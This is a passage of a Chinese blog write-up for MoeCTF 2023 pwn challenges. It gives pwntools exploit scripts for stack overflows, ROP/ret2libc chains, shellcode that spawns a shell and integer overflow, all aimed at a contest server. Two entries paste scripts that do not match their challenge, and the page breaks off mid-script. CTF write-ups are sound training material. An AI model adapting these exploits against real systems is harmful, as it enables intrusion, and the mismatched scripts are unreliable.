<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MoeCTF 2023 pwn wp | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>MoeCTF 2023 pwn wp</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-17T15:14:29.000Z" id="date"> 2023-09-17</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-17T15:50:01.298Z" id="updated"> 2023-09-17</time></div></span><br><span>Word Count: <div class="control">2.6k</div></span><br><span>Read Time: <div class="control">14 min</div></span></div></div><hr><div id="post-content"><h1 id="0x1-test-nc"><a href="#0x1-test-nc" class="headerlink" title="0x1 test_nc"></a>0x1 test_nc</h1><p>exp ls -al 可以查看隐藏文件</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  桌面 nc <span class="hljs-number">10.184</span><span class="hljs-number">.235</span><span class="hljs-number">.198</span> <span class="hljs-number">5660</span>                     <br>Oh, welcome here. Here is a shell <span class="hljs-keyword">for</span> you.<br>ls<br>bin<br>dev<br>gift<br>lib<br>lib32<br>lib64<br>libx32<br>test_nc<br>cat gift<br>Do you know linux hidden file?<br>ls -al<br>total <span class="hljs-number">92</span><br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Sep <span class="hljs-number">17</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> .<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Sep <span class="hljs-number">17</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> ..<br>-rwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>   <span class="hljs-number">220</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .bash_logout<br>-rwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">3771</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .bashrc<br>-rw-r--r-- <span class="hljs-number">1</span> <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">41</span> Sep <span class="hljs-number">17</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> .flag<br>-rwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>   <span class="hljs-number">807</span> Feb <span class="hljs-number">25</span>  <span class="hljs-number">2020</span> .profile<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Aug  <span class="hljs-number">8</span> <span class="hljs-number">04</span>:<span class="hljs-number">20</span> bin<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Aug  <span class="hljs-number">8</span> <span class="hljs-number">04</span>:<span class="hljs-number">20</span> dev<br>-rw-r--r-- <span class="hljs-number">1</span> <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">31</span> Sep <span class="hljs-number">17</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> gift<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Apr <span class="hljs-number">29</span> <span class="hljs-number">13</span>:<span class="hljs-number">36</span> lib<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Apr <span class="hljs-number">29</span> <span class="hljs-number">13</span>:<span class="hljs-number">36</span> lib32<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Apr <span class="hljs-number">29</span> <span class="hljs-number">13</span>:<span class="hljs-number">36</span> lib64<br>drwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span>  <span class="hljs-number">4096</span> Apr <span class="hljs-number">29</span> <span class="hljs-number">13</span>:<span class="hljs-number">36</span> libx32<br>-rwxr-x--- <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1000</span> <span class="hljs-number">19656</span> Aug  <span class="hljs-number">8</span> <span class="hljs-number">04</span>:<span class="hljs-number">19</span> test_nc<br>cat .flag<br><span class="hljs-comment">//moectf{bFQduCF542UCFh777wOV26ttbLDqd7SI}</span><br><br></code></pre></td></tr></tbody></table></figure>

<h1 id="0x2-baby-calculator"><a href="#0x2-baby-calculator" class="headerlink" title="0x2 baby_calculator"></a>0x2 baby_calculator</h1><p>exp</p>
<p>pwntools的利用</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">18115</span>)<br>context.log_level = <span class="hljs-string">'debug'</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    p.recvuntil(<span class="hljs-string">b'The first:'</span>)<br>    src1 = p.recvuntil(<span class="hljs-string">b'\n'</span>)<br>    <span class="hljs-built_in">print</span>(src1)<br>    p.recvuntil(<span class="hljs-string">b'The second:'</span>)<br>    src2 = p.recvuntil(<span class="hljs-string">b'\n'</span>)<br>    <span class="hljs-built_in">print</span>(src2)<br>    p.recvuntil(<span class="hljs-string">b'='</span>)<br>    res = p.recvuntil(<span class="hljs-string">b'\n'</span>)<br>    <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(src1) + <span class="hljs-built_in">int</span>(src2) == <span class="hljs-built_in">int</span>(res)):<br>        p.sendline(<span class="hljs-string">b'BlackBird'</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b'WingS'</span>)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h1 id="0x3-fd"><a href="#0x3-fd" class="headerlink" title="0x3 fd"></a>0x3 fd</h1><p>exp</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>i=<span class="hljs-number">0x200</span><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">27834</span>)<br>context.log_level = <span class="hljs-string">'debug'</span><br>p.sendafter(<span class="hljs-string">b'Please input its fd: '</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">670</span>))<br>res = p.recv()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h1 id="0x4-int-overflow"><a href="#0x4-int-overflow" class="headerlink" title="0x4 int_overflow"></a>0x4 int_overflow</h1><p>exp</p>
<p>直接输入对比数字的十进制就行了，在get_input里面atoi会把这个转换为int类型数据，溢出结果就是-114514</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('10.184.235.198',60757)</span><br>p = process(<span class="hljs-string">'./int_overflow'</span>)<br>context.log_level = <span class="hljs-string">'debug'</span><br>p.sendafter(<span class="hljs-string">b'Please input n:\n'</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">114514</span>))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.recv()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h1 id="0x5-ret2text-32"><a href="#0x5-ret2text-32" class="headerlink" title="0x5 ret2text_32"></a>0x5 ret2text_32</h1><p>exp 板子题</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote('10.184.235.198',60757)</span><br>p = process(<span class="hljs-string">'./int_overflow'</span>)<br>context.log_level = <span class="hljs-string">'debug'</span><br>p.sendafter(<span class="hljs-string">b'Please input n:\n'</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">114514</span>))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.recv()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h1 id="0x6-ret2text-64"><a href="#0x6-ret2text-64" class="headerlink" title="0x6 ret2text_64"></a>0x6 ret2text_64</h1><p>exp 板子题</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">63347</span>)<br><span class="hljs-comment">#p = process('./pwn')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>binsh = <span class="hljs-number">0x404050</span><br>system = <span class="hljs-number">0x4012B7</span><br>padding = <span class="hljs-number">255</span><br>pop_rdi = <span class="hljs-number">0x00000000004011be</span><br>main = <span class="hljs-number">0x4012BF</span><br>p.sendlineafter(<span class="hljs-string">b"What's your age?\n"</span>,<span class="hljs-built_in">str</span>(padding))<br><br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x7-shellcode-level0"><a href="#0x7-shellcode-level0" class="headerlink" title="0x7 shellcode_level0"></a>0x7 shellcode_level0</h1><p>exp 直接写shellcode 即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">8289</span>)<br><span class="hljs-comment">#p = process('./shellcode_level0')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>shellcode = asm(shellcraft.sh())<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x8-shellcode-level1"><a href="#0x8-shellcode-level1" class="headerlink" title="0x8 shellcode_level1"></a>0x8 shellcode_level1</h1><p>exp 这里只有 4 号那才有 shellcode 执行权限</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">63887</span>)<br><span class="hljs-comment">#p = process('./shellcode_level1')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p.sendlineafter(<span class="hljs-string">b'Which paper will you choose?\n'</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>shellcode = asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">b'what do you want to write?\n'</span>,shellcode)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h1 id="0x9-uninitialized-key"><a href="#0x9-uninitialized-key" class="headerlink" title="0x9 uninitialized_key"></a>0x9 uninitialized_key</h1><p>在两个函数中age和key的栈地址是一样的，通过调试也可以看出，但是key限制输入5位数字，age则不限制，那么在getname中输入114514，getkey中通过+号绕过输入即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">22740</span>)<br><span class="hljs-comment">#p = process('./shellcode_level1')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p.sendlineafter(<span class="hljs-string">b'Please input your age:\n'</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">114514</span>))<br><br>p.sendafter(<span class="hljs-string">b'Please input your key:\n'</span>,<span class="hljs-string">b''</span>)<br><br>p.interactive()<br><br><span class="hljs-comment">#0x7fffffffde14</span><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0xa-format-level0"><a href="#0xa-format-level0" class="headerlink" title="0xa format_level0"></a>0xa format_level0</h1><p>它把flag读取到栈里了，而且有格式化字符串漏洞，那么完全可以通过格式化字符串任意读读取flag</p>
<p>断点设置在格式化字符串漏洞处，可以看出flag的栈单元偏移为7，通过<code>%7$p</code>就可以得到flag的前四个字节，然后一次类推得到剩下的</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">64139</span>)<br><span class="hljs-comment">#p = process('./format_level0')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p.sendlineafter(<span class="hljs-string">b'Please input your age:\n'</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">114514</span>))<br><br>p.sendafter(<span class="hljs-string">b'Please input your key:\n'</span>,<span class="hljs-string">b''</span>)<br><br>p.interactive()<br><br><span class="hljs-comment">#0x7fffffffde14</span><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0xb-PIE-enabled"><a href="#0xb-PIE-enabled" class="headerlink" title="0xb PIE_enabled"></a>0xb PIE_enabled</h1><p>虽然开了pie，但是它给了vuln函数的实际地址，就可以算出elf的加载基地址，同时程序里给了system和”/bin/sh”字符串。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">3658</span>)<br><span class="hljs-comment">#p = process('./pwn')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>rdi_py = <span class="hljs-number">0x0000000000001323</span><br>system_py = <span class="hljs-number">0x11D8</span><br>binsh_py = <span class="hljs-number">0x4010</span><br><br>p.recvuntil(<span class="hljs-string">b"Vuln's address is:"</span>)<br>gift = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gift))<br><br>libc = gift - <span class="hljs-number">0x1245</span><br>log.info(<span class="hljs-string">"libc_base -&gt; %x"</span>,libc)<br><br>system = libc + system_py<br>log.info(<span class="hljs-string">"system -&gt; %x"</span>,system)<br>binsh = libc + binsh_py<br>log.info(<span class="hljs-string">"binsh -&gt; %x"</span>,binsh)<br>rdi = libc + rdi_py<br><br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span> + <span class="hljs-number">8</span>) + p64(rdi) + p64(binsh) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>

<h1 id="0xc-ret2libc"><a href="#0xc-ret2libc" class="headerlink" title="0xc ret2libc"></a>0xc ret2libc</h1><p>exp 板子题</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">40922</span>)<br><span class="hljs-comment">#p = process('./pwn')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./pwn'</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br><br>vuln = <span class="hljs-number">0x4011E8</span><br>pop_rdi_ret = <span class="hljs-number">0x000000000040117e</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br>main = <span class="hljs-number">0x40122B</span><br><br>payload1 = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>p.recvuntil(<span class="hljs-string">'But..maybe libc can help u??\n\n'</span>)<br>p.sendline(payload1)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>, puts_addr)<br><br>libc = LibcSearcher(<span class="hljs-string">'puts'</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">'puts'</span>)<br>log.info(<span class="hljs-string">"libc  -&gt; %x"</span>, libcbase)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">'system'</span>)<br>log.info(<span class="hljs-string">"system  -&gt; %x"</span>, system_addr)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">'str_bin_sh'</span>)<br>log.info(<span class="hljs-string">"binsh  -&gt; %x"</span>, binsh_addr)<br><br>payload2=<span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x50</span> + <span class="hljs-number">8</span>) + p64(ret) + p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)<br>p.recvuntil(<span class="hljs-string">'But..maybe libc can help u??\n\n'</span>)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h1 id="0xd-ret2syscall"><a href="#0xd-ret2syscall" class="headerlink" title="0xd ret2syscall"></a>0xd ret2syscall</h1><p>exp 板子题</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 0x000000000040117e : pop rax ; ret</span><br><span class="hljs-comment"># 0x000000000040115d : pop rbp ; ret</span><br><span class="hljs-comment"># 0x0000000000401180 : pop rdi ; ret</span><br><span class="hljs-comment"># 0x0000000000401183 : pop rdx ; ret</span><br><span class="hljs-comment"># 0x0000000000401182 : pop rsi ; pop rdx ; ret</span><br><span class="hljs-comment"># 0x000000000040101a : ret</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">'10.184.235.198'</span>,<span class="hljs-number">8066</span>)<br><span class="hljs-comment">#p = process('./ret2syscall')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./ret2syscall'</span>)<br><br>binsh = <span class="hljs-number">0x404040</span><br>sys = <span class="hljs-number">0x0000000000401185</span><br>rax = <span class="hljs-number">0x000000000040117e</span><br>rdi = <span class="hljs-number">0x0000000000401180</span><br>rsi_rdx = <span 